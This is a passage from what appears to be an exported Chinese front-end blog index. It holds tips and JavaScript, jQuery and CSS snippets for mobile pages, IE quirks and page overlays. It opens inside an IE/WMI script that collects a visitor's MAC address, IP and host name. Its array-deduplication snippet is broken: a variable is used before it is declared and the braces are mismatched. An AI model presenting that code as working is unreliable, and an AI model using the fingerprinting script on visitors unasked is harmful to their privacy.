&amp;amp;&amp;amp; objObject.IPEnabled != "undefined" &amp;amp;&amp;amp; objObject.IPEnabled == true)&#123;if(objObject.IPEnabled &amp;amp;&amp;amp; objObject.IPAddress(0) !=null &amp;amp;&amp;amp; objObject.IPAddress(0) != "undefined")sIPAddr = objObject.IPAddress(0);if(objObject.MACAddress != null &amp;amp;&amp;amp;objObject.MACAddress != "undefined")sMacAddr = objObject.MACAddress;if(objObject.DNSHostName != null &amp;amp;&amp;amp;objObject.DNSHostName != "undefined")sDNSName = objObject.DNSHostName;&#125;&lt;/script&gt;&lt;script FOR="foo" EVENT="OnCompleted(hResult,pErrorObject, pAsyncContext)" LANGUAGE="JScript"&gt;myForm.macAddress.value=sMacAddr;myForm.ipAddress.value=sIPAddr;myForm.hostName.value=sDNSName;&lt;/script&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>获取url</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动web开发常见问题解决方案]]></title>
    <url>%2F2015%2F07%2F12%2F%E7%A7%BB%E5%8A%A8web%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[1、1234567891011121314151617181920212223242526&amp;emsp;meta 标签位于 head 标签之间，是 HTML 语言的一个辅助性标签，合理的设置在移动端中起着非常重要的作用。下面列举几个常用的用法：```html // 强制让文档的宽度与设备的宽度保持1:1，并且文档最大的宽度比例是1.0，且不允许用户点击屏幕放大浏览 &lt;meta content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;&quot; name=&quot;viewport&quot;&gt; // 禁止百度SiteApp转码声明 &lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-siteapp&quot;&gt; // 禁止自动识别电话和邮箱； &lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no, email=no&quot;&gt; // 指定iphone中safari顶端的状态条的样式(default：白色；black：黑色；black-translucent ：半透明)； &lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black-translucent&quot;&gt; // 添加到 IOS 主屏后的标题 &lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;觉唯设计&quot;&gt; // 隐藏地址栏，启用 WebApp 全屏模式 &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt; // 优先使用 IE 最新版本和 Chrome &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge,chrome=1&quot;&gt; // 注明作者 &lt;meta name=&quot;author&quot; content=&quot;www.npm8.com&quot;&gt;2、font-family 字体选择1body &#123;font-family: "Helvetica Neue", Helvetica, STHeiTi, sans-serif;&#125;&emsp;&emsp;iOS 4.0+ 使用英文字体 Helvetica Neue，之前的iOS版本降级使用 Helvetica。中文字体设置为华文黑体STHeiTi（中文名称叫黑体-简）。设计时候一般用华文黑体来代替，两者差异微小。3、使用 rem 替代 em 单位&emsp;&emsp;rem（root element，html）是 CSS3 新增的一个相对单位，相对于根目录的 em 而不是相对于父元素，也就是说，它虽然是相对值，但是只是相对于根目录来说的（也就是 html），它不会随着其它元素的改变而改变。通过它既可以做到只修改根元素就成比例的调整所有字体大小，又可以避免字体大小逐层复合的连锁反应。从而可以有效的快速保持任何分辨率下保持视觉一致。4、禁止选择&emsp;&emsp;当你希望页面上的文字或者图片不被用户选择时候亦或者禁止长按保存图片时，可以使用这个方法来实现。是不是很方便的说，但注意的是不可滥用，否则会出现一些无法输入或者点击的情况。12345678a, img &#123; -webkit-touch-callout:none; /* 禁止长按链接与图片弹出菜单 */&#125;html, body &#123; -webkit-user-select:none; /* 禁止选中文本（如无文本选中需求，此为必选项） */ user-select:none;&#125;5、html5重力感应事件还记得满大街的摇一摇抽奖吗？大部分核心代码就是这个。123456789101112131415161718if (window.DeviceMotionEvent) &#123; window.addEventListener('devicemotion',deviceMotionHandler, false); &#125; var speed = 30;//speedvar x = y = z = lastX = lastY = lastZ = 0;function deviceMotionHandler(eventData) &#123; var acceleration =event.accelerationIncludingGravity; x = acceleration.x; y = acceleration.y; z = acceleration.z; if(Math.abs(x-lastX) &gt; speed || Math.abs(y-lastY) &gt; speed || Math.abs(z-lastZ) &gt; speed) &#123; alert('别摇那么大力嘛...'); // your code here &#125; lastX = x; lastY = y; lastZ = z;&#125;6、CSS3动效类型常见的CSS3动画效果类型：&nbsp;7、touch优化点击事件&emsp;&emsp;移动端上touch事件有四个，其触发顺序为：-> touchmove -> touchend -> touchcancel```12345678910111213141516171819202122232425262728293031323334353637383940414243在移动端 click 会有 300ms 的延迟，所以体验十分差，建议封装的 tap 事件来代替 click 事件（其实 tap 是由 touchstart 事件 + touchmove 判断 + touchend 事件封装组成）。&amp;emsp;&amp;emsp;**注：对于某些 android 系统 touch 的 bug:**比如手指在屏幕由上向下拖动页面时，理论上是会触发 一个 touchstart ，很多次 touchmove ，和最终的 touchend ，可是在android 4.0上，touchmove只被触发一次，触发时间和touchstart 差不多，而touchend直接没有被触发。这是一个非常严重的bug，在google Issue已有不少人提出 ,这个很蛋疼的bug是在模拟下拉刷新是遇到的尤其当touchmove的dom节点数量变多时比出现，当时解决办法就是用settimeout来稀释touchmove。### 8、base64编码图片替换小图片&amp;emsp;&amp;emsp;对于一些小图片icon之类的，可以将图片用base64编码，来减少网络请求。但是对于大图，就不要使用base64编码了，不然你的代码会变成无底洞，拉代码滚动条拉到你想哭。编码和解码也需要计算量，比较耗费CPU。base64有以下几个优点：* 减少了HTTP网络请求* 避免某些文件跨域的问题* 修改无需清缓冲，立即生效### 9、开启硬件加速优化动画效果&amp;emsp;&amp;emsp;如果你涉及到动画制作，是否经常发现在PC端效果非常不错，但是到了手机上就卡翔了。这个时候我们可以通过CSS开启硬件加速来改善动画效果，像Chrome, FireFox, Safari, IE9+和最新版本的Opera都支持硬件加速。CSS animations, transforms 以及 transitions 默认是不会自动开启GPU加速，而是需要某些CSS规则来触发，例如：transform: translate3d。开启硬件加速后可以解决页面闪白等问题，可以让渲染更流畅。### 10、布局使用display弹性自适应&amp;emsp;&amp;emsp;内容排版布局显示，尽量少使用float，建议使用display的box、flex等（多栏）自适应布局；优点表现在：* 独立的高度控制与对齐* 独立的元素顺序* 指定元素之间的关系* 灵活的尺寸和对齐方式### 11、增加按钮:active反应效果&amp;emsp;&amp;emsp;当用户在操作按钮的时候，如果按钮还是死死的，没有任何反应，这样子的体验是很差的，甚至是反人类的。在pc端我们都会习惯加上hover属性，来改变按钮状态；但移动端可不买这家伙的帐，在移动端没有鼠标一说，这个时候我们就可以让active上场了，带来的效果也是杠杠的。### 12、设置CSS3(@media)横竖屏样式```css //竖屏时使用的样式 @media all and (orientation:portrait) &#123; code here ... &#125; //横屏时使用的样式 @media all and (orientation:landscape) &#123; code here ... &#125;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动web开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript div 遮罩层封锁整个页面]]></title>
    <url>%2F2015%2F07%2F12%2Fjavascript-div-%E9%81%AE%E7%BD%A9%E5%B1%82%E5%B0%81%E9%94%81%E6%95%B4%E4%B8%AA%E9%A1%B5%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[在客户端浏览器中，可以在某个时机使用javascript把一个div作为遮罩层，来封锁整个页面。具体解决方案如下：一、IE和FF下document.body对象的clientHeight，offsetHeight，scrollHeight属性的差别。clientHeight在IE和FF下，该属性没什么差别，都是指浏览器的可视区域，即除去浏览器的那些工具栏状态栏剩下的页面展示空间的高度。offsetHeight在IE下，offsetHeight也是浏览器可视区域的高（包括边线）在FF下，offsetHeight是页面具体内容的高度scrollHeight在IE下，scrollHeight 是页面具体内容的高度，可以小于clientHeight在FF下，scrollHeight 是网页内容高度，不过最小值是clientHeight二、下面是跨浏览器取得当前页面的高度的解决方法。代码如下:1234567891011121314151617181920212223242526272829303132function getPageSize()&#123;var body = document.documentElement；var bodyOffsetWidth = 0;var bodyOffsetHeight = 0;var bodyScrollWidth = 0;var bodyScrollHeight = 0;var pageDimensions = [0,0];pageDimensions[0]=body.clientHeight;pageDimensions[1]=body.clientWidth;bodyOffsetWidth=body.offsetWidth;bodyOffsetHeight=body.offsetHeight;bodyScrollWidth=body.scrollWidth;bodyScrollHeight=body.scrollHeight;if(bodyOffsetHeight &gt; pageDimensions[0])&#123;pageDimensions[0]=bodyOffsetHeight;&#125;if(bodyOffsetWidth &gt; pageDimensions[1])&#123;pageDimensions[1]=bodyOffsetWidth;&#125;if(bodyScrollHeight &gt; pageDimensions[0])&#123;pageDimensions[0]=bodyScrollHeight;&#125;if(bodyScrollWidth &gt; pageDimensions[1])&#123;pageDimensions[1]=bodyScrollWidth;&#125;return pageDimensions;&#125;三、页面上必须放置一个div，作为遮罩层，下面是这个遮罩层的css样式。代码如下:12345678910111213.lockDiv&#123;position:absolute;left:0;top:0;height:0;width:0;border:2 solid red;display:none;text-align:center;background-color:#DBDBDB;filter:Alpha(opacity=60);&#125;四、在客户端使用下面的javascript用遮罩层将整个页面封闭。代码如下:123456789101112131415161718192021222324var sandglassSpan = 1;var timeHdl;function DisablePage()&#123;var ctrlSandglass = document.getElementById("divSandglass");if(sandglassSpan==0)&#123;window.clearTimeout(timeHdl);ctrlSandglass.style.display = "none";document.body.style.cursor = 'auto';sandglassSpan = 1;&#125;else&#123;document.body.style.cursor = 'wait';var pageDimensions = getPageSize();ctrlSandglass.style.top = 0;ctrlSandglass.style.left = 0;ctrlSandglass.style.height = pageDimensions[0];ctrlSandglass.style.width = pageDimensions[1];ctrlSandglass.style.display = "block";timeHdl = window.setTimeout(DisablePage,200);&#125;&#125;五、如果页面上使用了ASP.net的Validator控件，那么应该使用如下的javascript。代码如下:12345678910111213141516171819202122232425262728var sandglassSpan = 1;var timeHdl;function DisablePageHaveValidator()&#123;var ctrlSandglass = document.getElementById("divSandglass");if(false == Page_IsValid)&#123;sandglassSpan = 0;&#125;if(sandglassSpan==0)&#123;window.clearTimeout(timeHdl);ctrlSandglass.style.display = "none";document.body.style.cursor = 'auto';sandglassSpan = 1;&#125;else&#123;document.body.style.cursor = 'wait';ctrlSandglass.style.display = "block";var pageDimensions = getPageSize();ctrlSandglass.style.top = 0;ctrlSandglass.style.left = 0;ctrlSandglass.style.height = pageDimensions[0];ctrlSandglass.style.width = pageDimensions[1];timeHdl = window.setTimeout(DisablePageHaveValidator, 200);&#125;&#125;六、DisablePage和DisablePageHaveValidator这两个方法可以在按钮的onclick事件或其它时机调用。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js遮罩层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动前端头部标签(HTML5 head meta)]]></title>
    <url>%2F2015%2F07%2F12%2F%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AF%E5%A4%B4%E9%83%A8%E6%A0%87%E7%AD%BEhtml5-head-meta%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;移动前端开发中添加一些webkit专属的HTML5头部标签，帮助浏览器更好解析html代码，更好地将移动web前端页面表现出来。本文整理一些常用的meta标签。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;!DOCTYPE html&gt; &lt;!-- 使用 HTML5 doctype，不区分大小写 --&gt;&lt;html lang="zh-cmn-Hans"&gt; &lt;!-- 更加标准的 lang 属性写法 http://zhi.hu/XyIa --&gt;&lt;head&gt; &lt;!-- 声明文档使用的字符编码 --&gt; &lt;meta charset='utf-8'&gt; &lt;!-- 优先使用 IE 最新版本和 Chrome --&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/&gt; &lt;!-- 页面描述 --&gt; &lt;meta name="description" content="不超过150个字符"/&gt; &lt;!-- 页面关键词 --&gt; &lt;meta name="keywords" content=""/&gt; &lt;!-- 网页作者 --&gt; &lt;meta name="author" content="name, email@gmail.com"/&gt; &lt;!-- 搜索引擎抓取 --&gt; &lt;meta name="robots" content="index,follow"/&gt; &lt;!-- 为移动设备添加 viewport --&gt; &lt;meta name="viewport" content="initial-scale=1, maximum-scale=3, minimum-scale=1, user-scalable=no"&gt; &lt;!-- `width=device-width` 会导致 iPhone 5 添加到主屏后以 WebApp 全屏模式打开页面时出现黑边 http://bigc.at/ios-webapp-viewport-meta.orz --&gt; &lt;!-- iOS 设备 begin --&gt; &lt;meta name="apple-mobile-web-app-title" content="标题"&gt; &lt;!-- 添加到主屏后的标题（iOS 6 新增） --&gt; &lt;meta name="apple-mobile-web-app-capable" content="yes"/&gt; &lt;!-- 是否启用 WebApp 全屏模式，删除苹果默认的工具栏和菜单栏 --&gt; &lt;meta name="apple-itunes-app" content="app-id=myAppStoreID, affiliate-data=myAffiliateData, app-argument=myURL"&gt; &lt;!-- 添加智能 App 广告条 Smart App Banner（iOS 6+ Safari） --&gt; &lt;meta name="apple-mobile-web-app-status-bar-style" content="black"/&gt; &lt;!-- 设置苹果工具栏颜色 --&gt; &lt;meta name="format-detection" content="telphone=no, email=no"/&gt; &lt;!-- 忽略页面中的数字识别为电话，忽略email识别 --&gt; &lt;!-- 启用360浏览器的极速模式(webkit) --&gt; &lt;meta name="renderer" content="webkit"&gt; &lt;!-- 避免IE使用兼容模式 --&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;!-- 不让百度转码 --&gt; &lt;meta http-equiv="Cache-Control" content="no-siteapp" /&gt; &lt;!-- 针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓 --&gt; &lt;meta name="HandheldFriendly" content="true"&gt; &lt;!-- 微软的老式浏览器 --&gt; &lt;meta name="MobileOptimized" content="320"&gt; &lt;!-- uc强制竖屏 --&gt; &lt;meta name="screen-orientation" content="portrait"&gt; &lt;!-- QQ强制竖屏 --&gt; &lt;meta name="x5-orientation" content="portrait"&gt; &lt;!-- UC强制全屏 --&gt; &lt;meta name="full-screen" content="yes"&gt; &lt;!-- QQ强制全屏 --&gt; &lt;meta name="x5-fullscreen" content="true"&gt; &lt;!-- UC应用模式 --&gt; &lt;meta name="browsermode" content="application"&gt; &lt;!-- QQ应用模式 --&gt; &lt;meta name="x5-page-mode" content="app"&gt; &lt;!-- windows phone 点击无高光 --&gt; &lt;meta name="msapplication-tap-highlight" content="no"&gt; &lt;!-- iOS 图标 begin --&gt; &lt;link rel="apple-touch-icon-precomposed" href="/apple-touch-icon-57x57-precomposed.png"/&gt; &lt;!-- iPhone 和 iTouch，默认 57x57 像素，必须有 --&gt; &lt;link rel="apple-touch-icon-precomposed" sizes="114x114" href="/apple-touch-icon-114x114-precomposed.png"/&gt; &lt;!-- Retina iPhone 和 Retina iTouch，114x114 像素，可以没有，但推荐有 --&gt; &lt;link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144x144-precomposed.png"/&gt; &lt;!-- Retina iPad，144x144 像素，可以没有，但推荐有 --&gt; &lt;!-- iOS 图标 end --&gt; &lt;!-- iOS 启动画面 begin --&gt; &lt;link rel="apple-touch-startup-image" sizes="768x1004" href="/splash-screen-768x1004.png"/&gt; &lt;!-- iPad 竖屏 768 x 1004（标准分辨率） --&gt; &lt;link rel="apple-touch-startup-image" sizes="1536x2008" href="/splash-screen-1536x2008.png"/&gt; &lt;!-- iPad 竖屏 1536x2008（Retina） --&gt; &lt;link rel="apple-touch-startup-image" sizes="1024x748" href="/Default-Portrait-1024x748.png"/&gt; &lt;!-- iPad 横屏 1024x748（标准分辨率） --&gt; &lt;link rel="apple-touch-startup-image" sizes="2048x1496" href="/splash-screen-2048x1496.png"/&gt; &lt;!-- iPad 横屏 2048x1496（Retina） --&gt; &lt;link rel="apple-touch-startup-image" href="/splash-screen-320x480.png"/&gt; &lt;!-- iPhone/iPod Touch 竖屏 320x480 (标准分辨率) --&gt; &lt;link rel="apple-touch-startup-image" sizes="640x960" href="/splash-screen-640x960.png"/&gt; &lt;!-- iPhone/iPod Touch 竖屏 640x960 (Retina) --&gt; &lt;link rel="apple-touch-startup-image" sizes="640x1136" href="/splash-screen-640x1136.png"/&gt; &lt;!-- iPhone 5/iPod Touch 5 竖屏 640x1136 (Retina) --&gt; &lt;!-- iOS 启动画面 end --&gt; &lt;!-- iOS 设备 end --&gt; &lt;meta name="msapplication-TileColor" content="#000"/&gt; &lt;!-- Windows 8 磁贴颜色 --&gt; &lt;meta name="msapplication-TileImage" content="icon.png"/&gt; &lt;!-- Windows 8 磁贴图标 --&gt; &lt;link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"/&gt; &lt;!-- 添加 RSS 订阅 --&gt; &lt;link rel="shortcut icon" type="image/ico" href="/favicon.ico"/&gt; &lt;!-- 添加 favicon icon --&gt; &lt;!-- sns 社交标签 begin --&gt; &lt;!-- 参考微博API --&gt; &lt;meta property="og:type" content="类型" /&gt; &lt;meta property="og:url" content="URL地址" /&gt; &lt;meta property="og:title" content="标题" /&gt; &lt;meta property="og:image" content="图片" /&gt; &lt;meta property="og:description" content="描述" /&gt; &lt;!-- sns 社交标签 end --&gt; &lt;title&gt;标题&lt;/title&gt;&lt;/head&gt;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>html5 meta</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6不支持border-color:transparent 的问题解决]]></title>
    <url>%2F2015%2F07%2F12%2Fie6%E4%B8%8D%E6%94%AF%E6%8C%81border-colortransparent-%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[IE6不支持设置transparent为边框的颜色。例如：border:solid 1px transparent;解决方法：border:solid 1px transparent;_border-color:tomato;_filter:chroma(color=tomato);(说明: Chroma属性可以设置一个对象中指定的颜色为透明色，它的表达式如下：Filter：Chroma（color=color）这个属性的表达式是不是很简单，它只有一个参数。只需把您想要指定透明的颜色用Color参数设置出来就可以了。)结果如下：边框是没了，可字体怎么。。。主意，以上现象是只有在打开系统的ClearType时才会看到的，如果把ClearType关掉就没问题了，见下解决方法：border:solid 1px transparent;background-color:#BFDBFF;_border-color:tomato;_filter:chroma(color=tomato);]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>transparent</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ie下按keydown事件会触发button]]></title>
    <url>%2F2015%2F07%2F12%2Fie%E4%B8%8B%E6%8C%89keydown%E4%BA%8B%E4%BB%B6%E4%BC%9A%E8%A7%A6%E5%8F%91button%2F</url>
    <content type="text"><![CDATA[负责公司的一个b2c平台，头部那里有个搜索查询的功能，根据用户输入的内容按回车键也会跳转到响应的页面，后来在ie浏览器下惊奇的发现按回车键的同时它也会触发底部的邮箱订阅的button事件，开始以为是其它的地方用到了回车键从而冲突了，好来发现没有其它地方用到，找了好久都找不到原因，后来百度了一下，找到了相关的问题描述：说是Button才会有这个问题，如果是a标签呢，我也做了实验，a标签是不会有这样的问题的，只有button会有那该怎么解决呢？其实解决办法还是挺多的，比如可以把button换掉；我采用的是阻止keydown事件的默认行为preventDefault；的确解决问题。1.阻止浏览器的默认行为1234567891011function stopDefault(e) &#123;//如果提供了事件对象，则这是一个非IE浏览器if(e &amp;amp;&amp;amp; e.preventDefault) &#123;//阻止默认浏览器动作(W3C)e.preventDefault();&#125; else &#123;//IE中阻止函数器默认动作的方式window.event.returnValue = false;&#125;return false;&#125;2.停止事件冒泡1234567891011function stopBubble(e) &#123;//如果提供了事件对象，则这是一个非IE浏览器if(e &amp;amp;&amp;amp; e.stopPropagation) &#123;//因此它支持W3C的stopPropagation()方法e.stopPropagation();&#125; else &#123;//否则，我们需要使用IE的方式来取消事件冒泡window.event.cancelBubble = true;&#125;return false;&#125;具体应用：123456789101112131415161718192021&lt;script type="text/javascript"&gt;// &lt;![CDATA[ function enter_down(form, event) &#123; if(event.keyCode== "13") &#123; stopDefault(event); submitForm(form,'actionDiv'); &#125; &#125; function stopDefault(e) &#123; //如果提供了事件对象，则这是一个非IE浏览器 if(e &amp;&amp; e.preventDefault) &#123; //阻止默认浏览器动作(W3C) e.preventDefault(); &#125; else &#123; //IE中阻止函数器默认动作的方式 window.event.returnValue = false; &#125; return false; &#125;// ]]&gt;&lt;/script&gt;&lt;input id="appGrpName_s" name="appGrpName_s" type="text" /&gt;这样就可以解决ie下面按回车键触发button click（）事件了]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>keydown事件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[可以直接拿来用的15个jQuery代码片段]]></title>
    <url>%2F2015%2F07%2F12%2F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8B%BF%E6%9D%A5%E7%94%A8%E7%9A%8415%E4%B8%AAjquery%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;jQuery里提供了许多创建交互式网站的方法，在开发Web项目时，开发人员应该好好利用jQuery代码，它们不仅能给网站带来各种动画、特效，还会提高网站的用户体验。&emsp;&emsp;本文收集了15段非常实用的jQuery代码片段，你可以直接复制黏贴到代码里，但请开发者注意了，要理解代码再使用哦。下面就让我们一起来享受jQuery代码的魅力之处吧。1.预加载图片123456789101112(function($) &#123;var cache = [];// Arguments are image paths relative to the current page.$.preLoadImages = function() &#123;var args_len = arguments.length;for (var i = args_len; i--;) &#123;var cacheImage = document.createElement('img');cacheImage.src = arguments[i];cache.push(cacheImage);&#125;&#125;jQuery.preLoadImages("image1.gif", "/path/to/image2.png");2. 让页面中的每个元素都适合在移动设备上展示1234567891011var scr = document.createElement('script');scr.setAttribute('src', 'https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js');document.body.appendChild(scr);scr.onload = function()&#123;$('div').attr('class', '').attr('id', '').css(&#123;'margin' : 0,'padding' : 0,'width': '100%','clear':'both'&#125;);&#125;;3.图像等比例缩放1234567891011121314151617181920212223242526$(window).bind("load", function() &#123;// IMAGE RESIZE$('#product_cat_list img').each(function() &#123;var maxWidth = 120;var maxHeight = 120;var ratio = 0;var width = $(this).width();var height = $(this).height();if(width &gt; maxWidth)&#123;ratio = maxWidth / width;$(this).css("width", maxWidth);$(this).css("height", height * ratio);height = height * ratio;&#125;var width = $(this).width();var height = $(this).height();if(height &gt; maxHeight)&#123;ratio = maxHeight / height;$(this).css("height", maxHeight);$(this).css("width", width * ratio);width = width * ratio;&#125;&#125;);//$("#contentpage img").show();// IMAGE RESIZE&#125;);4.返回页面顶部12345678// Back To Top$(document).ready(function()&#123;$('.top').click(function() &#123;$(document).scrollTo(0,500);&#125;);&#125;);//Create a link defined with the class .top&lt;a href="#" class="top"&gt;Back To Top&lt;/a&gt;5.使用jQuery打造手风琴式的折叠效果1234567891011121314151617181920212223var accordion = &#123;init: function()&#123;var $container = $('#accordion');$container.find('li:not(:first) .details').hide();$container.find('li:first').addClass('active');$container.on('click','li a',function(e)&#123;e.preventDefault();var $this = $(this).parents('li');if($this.hasClass('active'))&#123;if($('.details').is(':visible')) &#123;$this.find('.details').slideUp();&#125; else &#123;$this.find('.details').slideDown();&#125;&#125; else &#123;$container.find('li.active .details').slideUp();$container.find('li').removeClass('active');$this.addClass('active');$this.find('.details').slideDown();&#125;&#125;);&#125;&#125;;6.通过预加载图片廊中的上一幅下一幅图片来模仿Facebook的图片展示方式12345678var nextimage = &quot;/images/some-image.jpg&quot;;$(document).ready(function()&#123;window.setTimeout(function()&#123;var img = $(&quot;&quot;).attr(&quot;src&quot;, nextimage).load(function()&#123;//all done&#125;);&#125;, 100);&#125;);7.使用jQuery和Ajax自动填充选择框12345678910111213$(function()&#123;$("select#ctlJob").change(function()&#123;$.getJSON("/select.php",&#123;id: $(this).val(), ajax: 'true'&#125;, function(j)&#123;var options = '';for (var i = 0; i &lt; j.length; i++) &#123;options += '' + j[i].optionDisplay + '';&#125;$("select#ctlPerson").html(options);&#125;)&#125;)&#125;)8.自动替换丢失的图片12345678// Safe Snippet$("img").error(function () &#123;$(this).unbind("error").attr("src", "missing_image.gif");&#125;);// Persistent Snipper$("img").error(function () &#123;$(this).attr("src", "missing_image.gif");&#125;);9.在鼠标悬停时显示淡入/淡出特效12345678$(document).ready(function()&#123;$(".thumbs img").fadeTo("slow", 0.6); // This sets the opacity of the thumbs to fade down to 60% when the page loads$(".thumbs img").hover(function()&#123;$(this).fadeTo("slow", 1.0); // This should set the opacity to 100% on hover&#125;,function()&#123;$(this).fadeTo("slow", 0.6); // This should set the opacity back to 60% on mouseout&#125;);&#125;);10.清空表单数据1234567891011121314151617181920function clearForm(form) &#123;// iterate over all of the inputs for the form// element that was passed in$(':input', form).each(function() &#123;var type = this.type;var tag = this.tagName.toLowerCase(); // normalize case// it's ok to reset the value attr of text inputs,// password inputs, and textareasif (type == 'text' || type == 'password' || tag == 'textarea')this.value = "";// checkboxes and radios need to have their checked state cleared// but should *not* have their 'value' changedelse if (type == 'checkbox' || type == 'radio')this.checked = false;// select elements need to have their 'selectedIndex' property set to -1// (this works for both single and multiple select elements)else if (tag == 'select')this.selectedIndex = -1;&#125;);&#125;;11.预防对表单进行多次提交123456789101112131415$(document).ready(function() &#123;$('form').submit(function() &#123;if(typeof jQuery.data(this, "disabledOnSubmit") == 'undefined') &#123;jQuery.data(this, "disabledOnSubmit", &#123; submited: true &#125;);$('input[type=submit], input[type=button]', this).each(function() &#123;$(this).attr("disabled", "disabled");&#125;);return true;&#125;else&#123;return false;&#125;&#125;);&#125;);12.动态添加表单元素12345//change event on password1 field to prompt new input$('#password1').change(function() &#123;//dynamically create new input and insert after password1$("#password1").append("");&#125;);13.让整个Div可点击1234$(".myBox").click(function()&#123;window.location=$(this).find("a").attr("href");return false; &#125;);14.平衡高度或Div元素12345var maxHeight = 0;$("div").each(function()&#123;if ($(this).height() &gt; maxHeight) &#123; maxHeight = $(this).height(); &#125;&#125;);$("div").height(maxHeight);15. 在窗口滚动时自动加载内容123456789101112131415161718var loading = false;$(window).scroll(function()&#123;if((($(window).scrollTop()+$(window).height())+250)&gt;=$(document).height())&#123;if(loading == false)&#123;loading = true;$('#loadingbar').css("display","block");$.get("load.php?start="+$('#loaded_max').val(), function(loaded)&#123;$('body').append(loaded);$('#loaded_max').val(parseInt($('#loaded_max').val())+50);$('#loadingbar').css("display","none");loading = false;&#125;);&#125;&#125;&#125;);$(document).ready(function() &#123;$('#loaded_max').val(50);&#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jQuery代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js过滤数组中相同的值]]></title>
    <url>%2F2015%2F07%2F12%2Fjs%E8%BF%87%E6%BB%A4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9B%B8%E5%90%8C%E7%9A%84%E5%80%BC%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617&lt;script type="text/javascript"&gt; Array.prototype.del = function() &#123; for (var i = 0; i &lt; l; i++) &#123; var a = &#123;&#125;, c = [], l = this.length; var b = this[i]; var d = (typeof b) + b; c.push(b); a[d] = 1; &#125; &#125; return c; &#125; var myArr=['text','text','5','2','2','3','4','5','5']; document.write(myArr.del());&lt;/script&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js过滤数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内容loading加载后高度变化CSS3 transition体验优化]]></title>
    <url>%2F2015%2F07%2F12%2F%E5%86%85%E5%AE%B9loading%E5%8A%A0%E8%BD%BD%E5%90%8E%E9%AB%98%E5%BA%A6%E5%8F%98%E5%8C%96css3-transition%E4%BD%93%E9%AA%8C%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[一、概述&emsp;&emsp;现在web技术不断发展，视图与数据渲染更多由前端呈现，后台更多与数据打交道。于是，我们会经常看到这样的交互场景。页面加载，看到一个框框里面有个菊花在转，然后内容呈现；或者点击个按钮，菊花在转，然后列表动态加载呈现。例如：&emsp;&emsp;是不是没有任何问题？确实，功能上OK，有菊花，用户也愿意等。但是，大家有没有觉得所有交互，出现菊花→出现内容，都是“砰砰砰”很生硬的感觉，尤其当内容是动态，高度不确定的时候。我们使用一些比较好的手机APP(如微信)的时候一定不会有这样的感觉，整个交互流程都是很流畅的，就像山涧的泉水，涓涓细流到山脚，而不是巨人在峡谷走路的感觉。&emsp;&emsp;所以，如果菊花的呈现到内容的展示能够通过自然的动画过渡呈现，势必会增强用户体验。&emsp;&emsp;而动态内容呈现主要变化的关键因素就是——高度，而过渡效果最佳利器是CSS3 transition, 于是，脑中不禁疑问，是不是可以借助CSS3 transition实现动态内容的高度动画呈现，渐进增强用户体验。&emsp;&emsp;其实，早在12年的时候，我就开始了这方面的尝试，我自己也瞅了瞅，发现当年的我讲废话的本领甩了现在的我两条长安街。大家直接从Part5 看就好了。其中，受限于当年略显稚嫩的技术，里面获得容器高度的方法，有些傻，大家就假装没看到。二、CSS3 transition的难点&emsp;&emsp;如果直接一行CSS代码就可以让动态呈现动画化，那就不需要本文了，早就各个站点都是这类优质体验的交互了。究其根本就是CSS3 transition的一个局限性，对&quot;auto&quot;*冷淡！嘛意思？&emsp;&emsp;大家很好理解，所谓“过渡”，就是从一个地方到另外一个地方，比方说，从0到100. 但是，你来个从0到auto, 